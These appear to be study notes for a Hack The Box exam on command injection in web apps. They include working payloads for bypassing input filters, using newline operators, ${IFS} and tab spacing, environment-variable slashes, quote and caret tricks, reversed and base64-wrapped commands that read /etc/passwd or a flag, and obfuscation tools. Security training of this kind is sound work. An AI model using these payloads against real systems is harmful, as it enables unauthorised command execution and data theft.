# Command Injection Methodology

**Core principle:** Enumerate before you exploit. Find the injection point, map what's filtered, then build the exact bypass needed — one layer at a time.

---

## Phase 1 — Detect the Injection Point

```bash
# Read the app first — understand what system command is likely running
curl -s http://<TARGET>/<page>
```

Look for inputs that feed into OS operations: host checkers, file managers, search features, ping utilities, any field that triggers a system-level action.

### Test each input with injection operators (one at a time)
```
127.0.0.1;whoami
127.0.0.1&&whoami
127.0.0.1||whoami
127.0.0.1%0awhoami
```

If output changes → injectable. If no change → move to next input.

### Front-end vs back-end validation
If the browser shows an error but **no network request is made** (check DevTools Network tab) → front-end validation only → bypass with Burp Repeater or curl directly.

---

## Phase 2 — Enumerate the Filter (Critical Workflow)

**Never assume what's blocked. Test each layer independently.**

### Step 1 — Test operator alone (no command)
```bash
curl -d "ip=127.0.0.1%3b"    # semicolon
curl -d "ip=127.0.0.1%0a"    # newline
curl -d "ip=127.0.0.1%26"    # &
curl -d "ip=127.0.0.1%7c"    # |
```
- Returns "Invalid input" → operator is blacklisted
- Returns normal output → operator is NOT blacklisted → use this one

### Step 2 — Test space alone (add space after confirmed operator)
```bash
curl -d "ip=127.0.0.1%0a%20"    # space after newline
```
- Invalid → space is blacklisted → need space bypass

### Step 3 — Test command alone (add command after confirmed operator)
```bash
curl -d "ip=127.0.0.1%0awhoami"
```
- Invalid after operator passes → command is blacklisted → need command obfuscation

**Each layer has its own filter. Map them separately before trying to bypass them.**

---

## Phase 3 — Bypass Blacklisted Operators

| Operator | URL-Encoded | Notes |
|----------|------------|-------|
| `;` | `%3b` | Usually blacklisted |
| `&&` | `%26%26` | Usually blacklisted |
| `\|\|` | `%7c%7c` | Usually blacklisted |
| `\n` (newline) | `%0a` | **Often NOT blacklisted** — try this first |
| `&` | `%26` | Often blacklisted |
| `\|` | `%7c` | Often blacklisted |

**The newline `%0a` is the most reliable operator bypass** — it's often omitted from blacklists.

---

## Phase 4 — Bypass Blacklisted Spaces

| Technique | Example | Works On |
|-----------|---------|----------|
| Tab | `%09` | Linux + Windows |
| `${IFS}` | `cmd${IFS}-arg` | Linux only |
| Brace expansion | `{cmd,-arg}` | Linux only |

```bash
# Space bypass examples
127.0.0.1%0als%09-la          # tab
127.0.0.1%0als${IFS}-la       # IFS (use single quotes in curl to prevent local expansion)
127.0.0.1%0a{ls,-la}          # brace expansion
```

**Always use single quotes in curl `-d` argument to prevent local shell expansion of `${IFS}`.**

---

## Phase 5 — Bypass Blacklisted Characters (slash, semicolon)

### Slash bypass (Linux)
```bash
${PATH:0:1}        # PATH starts with / → gives /
${HOME:0:1}        # HOME starts with / → gives /
```

### Semicolon bypass
```bash
${LS_COLORS:10:1}  # LS_COLORS contains ; at index 10
```

### Character shifting
```bash
# ASCII table: [ is 91, \ is 92 → shift [ by 1 to get \
$(tr '!-}' '"-~'<<<[)    # produces \
```

### Windows equivalents
```cmd
%HOMEPATH:~6,-11%         # CMD — produces \
$env:HOMEPATH[0]          # PowerShell — produces \
```

---

## Phase 6 — Bypass Blacklisted Commands

### Quote insertion (Linux + Windows)
```bash
w'h'o'am'i     # single quotes ignored by shell
w"h"o"am"i     # double quotes ignored by shell
# Rules: don't mix quote types, must be even number of quotes
```

### Linux-only bypasses
```bash
who$@ami        # $@ expands to empty string
w\ho\am\i       # backslash ignored in commands
```

### Windows-only
```cmd
who^ami         # caret ignored by CMD
```

### Case manipulation (Linux — case-sensitive)
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")          # tr converts to lowercase
$(a="WhOaMi";printf %s "${a,,}")           # bash lowercase expansion
# Replace spaces with %09 before sending
```

### Reversed commands
```bash
# Reverse the command first:
echo 'whoami' | rev    # → imaohw

# Execute reversed:
$(rev<<<'imaohw')      # → runs whoami
```

### Base64 encoding (most powerful — bypasses ALL character + command filters)
```bash
# Step 1: encode locally
echo -n 'cat /etc/passwd' | base64
# → Y2F0IC9ldGMvcGFzc3dk

# Step 2: send encoded payload
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# Note: use <<< instead of | to avoid pipe character being filtered
```

---

## Phase 7 — Automated Obfuscation Tools

### Bashfuscator (Linux)
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator && pip3 install setuptools==65 && python3 setup.py install --user
cd ./bashfuscator/bin/

# Use -s 1 -t 1 --no-mangling --layers 1 to keep payload short
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Test locally before sending
bash -c '<obfuscated payload>'
```

### DOSfuscation (Windows)
```powershell
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
> SET COMMAND type C:\flag.txt
> encoding
> 1
```

---

## Full Bypass Stack (Most Common Combination)

When facing a filter that blocks `;`, `&`, `|`, spaces, slashes, and common commands:

```bash
# Operator: %0a (newline)
# Space: ${IFS}
# Slash: ${PATH:0:1}
# Command: obfuscate with $@ or base64

# Example — read /flag.txt with all bypasses:
ip=127.0.0.1%0aca$@t${IFS}${PATH:0:1}flag.txt

# Example — run complex command (pipes, spaces, slashes) with base64:
# Step 1: encode
echo -n 'cat /flag.txt' | base64
# Step 2: send
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<BASE64HERE)
```

---

## Decision Flow

```
Find input that feeds OS command
  └─ Test injection operators in isolation (no command)
       └─ Which operator passes? → use it
  └─ Add space → blocked?
       └─ Yes → use %09 or ${IFS}
  └─ Add command → blocked?
       └─ Yes → obfuscate: $@, quotes, reverse, or base64
  └─ Command contains filtered chars (/, |, spaces)?
       └─ Yes → base64 encode entire command
                bash<<<$(base64${IFS}-d<<<BASE64)
```

---

## HTB Exam Notes

- **Blacklists are always incomplete** — newline `%0a` is almost never blocked
- **Test in isolation** — strip the command and test just the operator to separate character vs command blacklisting
- **Two independent filter layers** — character filter and command filter are checked separately
- **Base64 is the nuclear option** — encodes everything, nothing needs to survive the filter except `bash<<<$(base64${IFS}-d<<<...)`
- **Always use single quotes in curl** — prevents local shell expansion of `${IFS}`, `${PATH:0:1}`, `$@`
- **Compare response sizes** — if grep finds nothing, check `wc -c` to detect blind output changes
